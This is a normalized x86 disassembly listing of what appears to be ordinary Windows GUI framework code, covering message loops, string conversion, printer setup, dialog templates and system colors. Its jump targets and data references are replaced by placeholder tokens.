lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_441fb5
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_42e2d0
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_4420b0
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_4425c7
push esi
mov esi ecx
call sub_4420f1
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_4425ef
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_442578
mov eax [ esi ]
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
mov eax [ esi ]
pop edi
pop esi
retn 0x4
sub_44262f
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp ecx [ eax - 0x8 ]
jge r-xdata
or eax 0xffffffff
jmp r-xdata
add eax ecx
movzx ecx [ esp + 0x8 ]
push ecx
push eax
call sub_42e6a3
pop ecx
test eax eax
pop ecx
jne r-xdata
pop esi
retn 0x8
sub eax [ esi ]
sub_44265c
push esi
mov esi ecx
push [ esp + 0x8 ]
mov eax [ esi ]
push eax
call sub_42e73a
pop ecx
test eax eax
pop ecx
jne r-xdata
sub eax [ esi ]
or eax 0xffffffff
jmp r-xdata
pop esi
retn 0x4
sub_4426a7
push ebx
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push esi
mov esi [ esp + 0xc ]
jne r-xdata
push ebx
push ebx
push [ esp + 0x1c ]
push esi
push 0xffffffff
push [ esp + 0x24 ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
jle r-xdata
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
mov [ eax + esi - 0x1 ] bl
xor eax eax
jmp r-xdata
sub_4426dd
cmp [ esp + 0xc ] 0x0
push esi
mov esi [ esp + 0x8 ]
jne r-xdata
push [ esp + 0x10 ]
push esi
push 0xffffffff
push [ esp + 0x18 ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
test esi esi
je r-xdata
pop esi
retn
and [ esi + eax * 2 - 0x2 ] 0x0
xor eax eax
pop esi
retn
sub_442718
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx esi
call sub_442988
pop esi
retn
call sub_45175f
test eax eax
je r-xdata
push 0x0
call sub_45b297
sub_44273a
push esi
push edi
mov edi ecx
call sub_420710
mov esi eax
xor eax eax
push eax
push eax
push 0x36a
mov [ edi + 0x84 ] eax
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
push [ esp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ esp + 0x10 ]
call [ eax + 0x6c ]
pop edi
pop esi
retn 0x8
sub_442771
mov edx [ esp + 0x8 ]
push esi
mov eax [ edx + 0x4 ]
mov esi eax
dec esi
je r-xdata
push edx
push [ esp + 0xc ]
call sub_442c47
sub esi 0xe
je r-xdata
push ebx
xor ebx ebx
push edi
cmp eax 0x111
mov edi 0xf108
jne r-xdata
mov esi [ esp + 0x10 ]
push r--data
mov ecx esi
call sub_442eba
test eax eax
je r-xdata
cmp [ edx + 0xc ] ebx
jne r-xdata
push r--data
mov ecx esi
call sub_442eba
test eax eax
jne r-xdata
mov eax [ esi ]
push edi
push 0x1030
jmp r-xdata
push 0x1
pop ebx
inc edi
mov eax ebx
pop edi
pop ebx
jmp r-xdata
mov eax [ esi ]
push edi
push 0x10
mov ecx esi
call [ eax + 0x10 ]
pop esi
retn 0x8
sub_4427e8
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jg r-xdata
cmp edi 0x1
jne r-xdata
push edi
call sub_442a64
mov ecx [ esi + 0x80 ]
and [ ebp + 0x8 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
cmp edi 0x1
pop edi
pop esi
setl al
pop ebp
retn 0x4
push edi
mov ecx esi
call sub_442a64
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ esi + 0x80 ]
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x14 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x88 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
sub_442852
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_447a7b
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_447a7b
mov [ esi + 0x94 ] edi
sub_442914
call sub_45357b
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
push esi
call sub_453349
mov esi eax
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_442c6c
push 0xffffffff
call [ SetWindowsHookExA@IAT ]
push sub_453064
mov ecx rw-data
mov [ esi + 0x30 ] eax
call sub_455223
mov esi eax
cmp [ esi + 0x14 ] 0x0
je r-xdata
push sub_454384
mov ecx rw-data
call sub_45518e
pop esi
call sub_45357b
push [ eax + 0x8 ]
call [ esi + 0x14 ]
sub_442988
push ecx
push ebx
push ebp
push esi
push edi
push 0x1
xor ebx ebx
mov esi ecx
pop edi
mov [ esp + 0x10 ] ebx
mov eax [ esi ]
mov ecx esi
call [ eax + 0x5c ]
test eax eax
je r-xdata
lea ebp [ esi + 0x30 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi ]
lea ebp [ esi + 0x30 ]
push ebp
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esi ]
inc [ esp + 0x10 ]
push eax
mov ecx esi
call [ edx + 0x60 ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push 0x1
mov [ esp + 0x14 ] ebx
pop edi
cmp edi ebx
jne r-xdata
xor edi edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
sub_442a07
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax + 0x4 ]
cmp esi 0x200
je r-xdata
mov edx [ eax + 0x14 ]
mov edi [ eax + 0x18 ]
cmp [ ecx + 0x5c ] edx
jne r-xdata
cmp esi 0xa0
je r-xdata
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x18 ]
mov [ ecx + 0x5c ] edx
mov [ ecx + 0x60 ] esi
mov eax [ eax + 0x4 ]
mov [ ecx + 0x64 ] eax
cmp [ ecx + 0x60 ] edi
jne r-xdata
cmp esi 0xf
je r-xdata
cmp esi [ ecx + 0x64 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp esi 0x118
jne r-xdata
pop edi
pop esi
retn 0x4
push 0x1
pop eax
sub_442a64
push ebx
push ebp
xor ebp ebp
push esi
cmp [ esp + 0x10 ] ebp
push edi
jg r-xdata
call sub_45357b
add eax 0x1070
push sub_4535ed
mov ecx eax
call sub_45518e
cmp [ eax + 0x10 ] ebp
jne r-xdata
mov edi [ ecx + 0x1c ]
mov ebx 0x363
cmp edi ebp
je r-xdata
xor eax eax
cmp [ esp + 0x14 ] ebp
pop edi
pop esi
pop ebp
pop ebx
setl al
retn 0x4
call sub_4433b9
push 0x1
call sub_4433c2
call sub_45357b
add eax 0x1070
push sub_4535ed
mov ecx eax
call sub_45518e
mov esi [ eax + 0x8 ]
mov eax [ edi + 0x1c ]
cmp eax ebp
je r-xdata
cmp [ esi + 0x1c ] ebp
je r-xdata
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov esi [ esi + 0x54 ]
jmp r-xdata
cmp esi edi
je r-xdata
push ebp
push 0x1
pop esi
push esi
push ebx
push [ edi + 0x1c ]
push edi
call sub_43e5e8
push esi
push esi
push ebp
push esi
push ebx
push [ edi + 0x1c ]
call sub_43ff47
cmp esi ebp
je r-xdata
cmp [ esi + 0x88 ] ebp
jne r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
push ebp
mov ecx esi
call sub_4417ff
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
push esi
call sub_43e5e8
push 0x1
push 0x1
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
call sub_43ff47
cmp [ esi + 0x88 ] ebp
jl r-xdata
or [ esi + 0x88 ] 0xffffffff
push eax
mov ecx esi
call sub_4417ff
mov eax [ esi + 0x88 ]
cmp eax ebp
jle r-xdata
sub_442b6f
push ecx
mov eax [ ecx ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] ecx
call [ eax + 0x28 ]
mov esi eax
xor ebp ebp
cmp esi ebp
je r-xdata
xor eax eax
mov ebx [ esp + 0x18 ]
mov edi 0xc000
mov eax [ esi + 0x4 ]
push ebp
push ebp
push edi
push ebp
push ebp
push eax
push [ esi + 0x4 ]
call sub_43f5d5
cmp eax ebp
jne r-xdata
mov esi [ esi ]
cmp esi ebp
jne r-xdata
mov ecx [ eax + 0x10 ]
mov ecx [ ecx ]
cmp ecx [ ebx + 0x4 ]
je r-xdata
push [ ebx + 0xc ]
mov ecx [ esp + 0x14 ]
push [ ebx + 0x8 ]
call [ eax + 0x14 ]
push 0x1
pop eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp eax edi
jae r-xdata
jmp r-xdata
push ebp
push ebp
push edi
add eax 0x18
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
push eax
call sub_43f5d5
cmp eax ebp
je r-xdata
sub_442bea
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
jne r-xdata
call sub_420710
mov esi eax
test esi esi
je r-xdata
push edi
call sub_442b6f
test eax eax
jne r-xdata
push edi
push eax
call sub_44050f
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x4
xor eax eax
push [ edi ]
call sub_43e7b3
mov ecx eax
call sub_43fd7e
cmp eax esi
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x90 ]
jmp r-xdata
sub_442c47
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
jne r-xdata
cmp eax 0xf
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push 0x0
push [ ecx ]
call [ ValidateRect@IAT ]
retn 0x8
sub_442c6c
push esi
call sub_45357b
cmp [ eax + 0x14 ] 0x0
mov esi [ esp + 0x8 ]
jne r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push esi
push [ eax + 0x30 ]
call [ CallNextHookEx@IAT ]
test esi esi
jge r-xdata
call sub_4428ff
test eax eax
je r-xdata
cmp esi 0x8001
jne r-xdata
push [ esp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push esi
call [ edx + 0x70 ]
jmp r-xdata
pop esi
retn 0xc
sub_442cc4
mov eax [ esp + 0x4 ]
push esi
cmp [ eax + 0x4 ] 0x100
jne r-xdata
xor eax eax
cmp [ eax + 0x8 ] 0x70
jne r-xdata
mov eax [ eax + 0xc ]
shr eax 0x10
test ah 0x40
jne r-xdata
mov esi [ GetKeyState@IAT ]
push 0x10
call esi
test ax ax
jl r-xdata
push 0x11
call esi
test ax ax
jl r-xdata
push 0x12
call esi
test ax ax
jl r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_442d0f
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax ebx
je r-xdata
call sub_420710
cmp [ rw-data ] 0x333
mov edi eax
jae r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
push [ esi ]
call sub_43e7b3
cmp eax ebx
je r-xdata
sub eax 0x7fff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] ebx
je r-xdata
push esi
call sub_442cc4
test eax eax
je r-xdata
mov ecx eax
call sub_43fe5b
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
push ebx
push 0xe146
push 0x111
push [ edi + 0x1c ]
jmp r-xdata
mov ecx edi
call sub_4414d5
test eax eax
je r-xdata
cmp eax 0x108
ja r-xdata
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ edi + 0x50 ] ebx
je r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
mov ebx eax
cmp [ ebx + 0xbc ] 0x0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
call sub_420710
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
push 0x7
lea edi [ ebp - 0x20 ]
pop ecx
mov [ ebx + 0xbc ] 0x1
[ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
mov ecx [ esi + 0x20 ]
call sub_441826
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov ecx [ esi + 0x4 ]
cmp ecx 0x100
jne r-xdata
and [ ebx + 0xbc ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
test eax eax
je r-xdata
cmp ecx 0x202
jne r-xdata
cmp [ esi + 0x8 ] 0xd
je r-xdata
and [ ebx + 0xbc ] 0x0
push ebx
push 0xe146
push 0x111
push [ eax + 0x1c ]
sub_442e74
push esi
mov esi ecx
xor eax eax
push edi
push eax
lea edi [ esi + 0x30 ]
push eax
push eax
push edi
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
retn
cmp [ esi + 0x34 ] 0x36a
je r-xdata
push 0x1
pop eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x58 ]
test eax eax
jne r-xdata
push edi
call [ TranslateMessage@IAT ]
push edi
call [ DispatchMessageA@IAT ]
sub_442eec
mov eax sub_463ef8
call sub_42dc88
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_442f99
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_4496b7
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4496ef
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_442fee
push esi
push edi
mov edi [ esp + 0xc ]
xor eax eax
cmp edi eax
mov esi ecx
jne r-xdata
push edi
call sub_4430e7
pop ecx
push eax
push edi
mov ecx esi
call sub_44301d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
sub_44301d
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
add eax 0x40
push eax
push 0x40
call [ GlobalAlloc@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
pop esi
retn 0x8
push edi
push eax
call [ GlobalLock@IAT ]
push [ esi + 0x4 ]
mov edi eax
push [ esp + 0x10 ]
push edi
call sub_42e2d0
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
jne r-xdata
mov eax [ edi ]
mov eax [ edi + 0xc ]
jmp r-xdata
push [ esi ]
not eax
shr eax 0x6
and eax 0x1
mov [ esi + 0x8 ] eax
call [ GlobalUnlock@IAT ]
push 0x1
pop eax
pop edi
sub_443091
mov eax [ esp + 0x4 ]
cmp [ eax + 0x2 ] 0xffff
jne r-xdata
add eax 0x12
add eax 0x1a
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax edx
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
retn
sub_4430e7
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
cmp [ ebx + 0x2 ] 0xffff
push ebx
sete al
mov esi eax
call sub_443091
cmp [ ebx + 0x2 ] 0xffff
pop ecx
jne r-xdata
mov ecx [ ebx ]
mov ecx [ ebx + 0xc ]
jmp r-xdata
test esi esi
je r-xdata
mov ecx esi
push edi
neg ecx
sbb ecx ecx
and ecx 0x2
inc ecx
lea edi [ eax + ecx * 2 ]
push edi
call sub_42e686
pop ecx
lea eax [ edi + eax * 2 + 0x2 ]
pop edi
test cl 0x40
je r-xdata
mov cx [ ebx + 0x8 ]
mov cx [ ebx + 0x10 ]
jmp r-xdata
sub eax ebx
pop esi
pop ebx
retn
neg esi
sbb esi esi
and esi 0x6
add esi 0x12
movzx edx cx
test cx cx
jbe r-xdata
add eax 0x2
add eax 0x4
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x2
add eax 0x4
jmp r-xdata
test cx cx
je r-xdata
movzx ecx [ eax ]
dec edx
lea eax [ eax + ecx + 0x2 ]
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x3
and al 0xfc
add eax esi
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
test cx cx
je r-xdata
sub_44319f
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x2 ] 0xffff
jne r-xdata
mov eax [ esi ]
mov eax [ esi + 0xc ]
jmp r-xdata
push esi
call sub_443091
mov edx [ esp + 0x14 ]
pop ecx
mov cx [ eax ]
push 0x0
mov [ edx ] cx
xor ecx ecx
cmp [ esi + 0x2 ] 0xffff
push 0x0
push 0x20
push 0x20
setne cl
dec ecx
and ecx 0x2
inc ecx
lea esi [ eax + ecx * 2 ]
mov ecx [ esp + 0x1c ]
call sub_4425ef
push eax
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ecx [ esp + 0xc ]
push 0xffffffff
call sub_4425c7
push 0x1
pop eax
pop esi
retn
xor eax eax
pop esi
retn
test al 0x40
jne r-xdata
sub_44320e
push ebp
mov ebp esp
sub esp 0x50
push edi
xor edi edi
cmp [ ecx + 0x4 ] edi
mov [ ebp - 0x8 ] ecx
jne r-xdata
push ebx
push esi
push [ ecx ]
call [ GlobalLock@IAT ]
mov ebx eax
xor ecx ecx
mov ax [ ebx + 0x2 ]
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x4 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ ebx + 0xc ]
jmp r-xdata
pop edi
leave
retn 0x8
or [ ebx ] 0x40
or [ ebx + 0xc ] 0x40
jmp r-xdata
mov esi [ ebp - 0x4 ]
and eax 0x40
neg esi
sbb esi esi
mov [ ebp - 0xc ] eax
and esi 0x2
inc esi
shl esi 0x1
cmp [ ebp - 0x4 ] edi
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edi + 0x3 ]
and al 0xfc
lea edi [ edi + edx + 0x3 ]
mov [ ebp - 0xc ] eax
and edi 0xfffffffc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ edi + esi ]
push eax
call sub_42e686
pop ecx
lea ecx [ esi + eax * 2 + 0x2 ]
lea eax [ ebp - 0x50 ]
push 0x20
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ esi + eax * 2 ]
push ebx
mov [ ebp + 0x8 ] eax
call sub_443091
pop ecx
mov edi eax
xor ecx ecx
mov [ ebp - 0x10 ] edi
cmp [ ebp - 0xc ] ecx
je r-xdata
mov dx [ ebx + 0x8 ]
mov dx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp + 0xc ]
sub eax esi
push eax
mov [ ecx ] dx
lea eax [ ebp - 0x50 ]
add ecx esi
push eax
push ecx
call sub_42ea90
mov esi [ ebp - 0x8 ]
sub edi [ ebp - 0xc ]
add esp 0xc
push [ esi ]
add [ esi + 0x4 ] edi
call [ GlobalUnlock@IAT ]
and [ esi + 0x8 ] 0x0
push 0x1
pop eax
pop esi
pop ebx
test dx dx
jbe r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
sub ebx eax
add ebx [ ecx + 0x4 ]
push ebx
push eax
push edi
call sub_42ea90
add esp 0xc
sub_443328
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
mov esi [ GetStockObject@IAT ]
push edi
push 0xa
mov [ ebp - 0x4 ] ecx
pop ebx
mov edi r--data
push 0x11
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
push 0x3c
push eax
call [ GetObjectA@IAT ]
test eax eax
je r-xdata
push 0xd
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
lea edi [ ebp - 0x24 ]
call [ GetDC@IAT ]
mov esi eax
mov eax [ ebp - 0x40 ]
test eax eax
jge r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
call sub_44320e
pop edi
pop esi
pop ebx
leave
retn 0x4
mov [ ebp + 0x8 ] ebx
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
push eax
push 0x48
push [ ebp - 0x40 ]
call [ MulDiv@IAT ]
push esi
push 0x0
mov ebx eax
call [ ReleaseDC@IAT ]
neg eax
mov [ ebp - 0x40 ] eax
sub_4433c2
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_4535a1
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
cmp eax esi
je r-xdata
xor eax eax
pop edi
cmp [ ebx + 0x10 ] eax
pop esi
pop ebx
setne al
pop ebp
retn 0x4
dec eax
cmp eax esi
mov [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
call sub_45357b
mov edi [ eax + 0x4 ]
push sub_452fff
mov ecx rw-data
call sub_45518e
test edi edi
mov esi eax
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
call sub_4435e0
mov ecx [ ebx + 0x1c ]
call sub_4435e0
mov ecx [ ebx + 0x18 ]
call sub_4435e0
mov ecx [ ebx + 0x14 ]
call sub_4435e0
mov ecx [ ebx + 0x24 ]
call sub_4435e0
call sub_4428ff
cmp eax esi
je r-xdata
cmp [ edi + 0xb8 ] 0x0
je r-xdata
push eax
call sub_42fb3d
cmp eax [ edi + 0xb8 ]
pop ecx
jae r-xdata
mov eax [ eax + 0x54 ]
cmp eax esi
je r-xdata
mov eax [ esi + 0xc ]
and [ ebp + 0x8 ] 0x0
test eax eax
je r-xdata
push esi
push esi
call eax
push [ edi + 0xb8 ]
call sub_42dd9c
test eax eax
pop ecx
mov [ esi + 0xc ] eax
jne r-xdata
push eax
call sub_42fb3d
push [ esi + 0xc ]
mov [ ebp + 0x8 ] eax
call sub_42ded6
pop ecx
pop ecx
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_42dd9c
pop ecx
mov [ esi + 0xc ] eax
sub_4434bc
mov eax sub_463f26
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_43d402
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_43d402
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_43d6cd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_443521
mov eax sub_463f30
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_43d531
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_43d531
test eax eax
je r-xdata
push sub_447ab1
call sub_441e77
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_442eec
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_43d586
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_441e77
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_43b7b5
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_4435e0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_43d445
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_43d618
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_443645
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_443689
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_45540e
call sub_4553de
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
